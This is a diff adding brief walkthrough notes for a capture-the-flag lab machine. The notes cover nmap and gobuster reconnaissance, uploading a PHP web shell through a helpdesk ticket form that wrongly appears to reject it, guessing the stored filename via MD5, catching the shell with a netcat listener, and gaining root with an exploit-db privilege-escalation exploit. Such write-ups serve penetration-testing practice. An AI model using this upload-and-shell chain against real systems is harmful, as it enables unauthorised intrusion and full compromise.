@@ -1,0 +1,11 @@
+1. nmap -sC -sV -T4 10.10.10.121 -oN nmap
+2. gobuster -u 10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+3. Open up a browser - http://10.10.10.121/support
+4. Messing around with the ticket - the error messages SAYS the file type is not allowed, but if you inspect the HTML, it is actually uploaded. Nice. 
+5. Lets upload a php shell then. 
+6. php -a 
+7. echo md5("phpshell.php1559886734");04215397f1a751cf60d7e42fc06a6767
+8. Start listener: nc -lvp 9001 *Looks like our file is uploaded to http://<helpdeskbaseurl>/uploads/tickets/<md5>.<file extension>
+9. Grab shell http://10.10.10.121/support/uploads/tickets/04215397f1a751cf60d7e42fc06a6767.php
+10. https://www.exploit-db.com/exploits/44298 - Priv Esc exploit. Compile code and run.
+11. Boom root. 
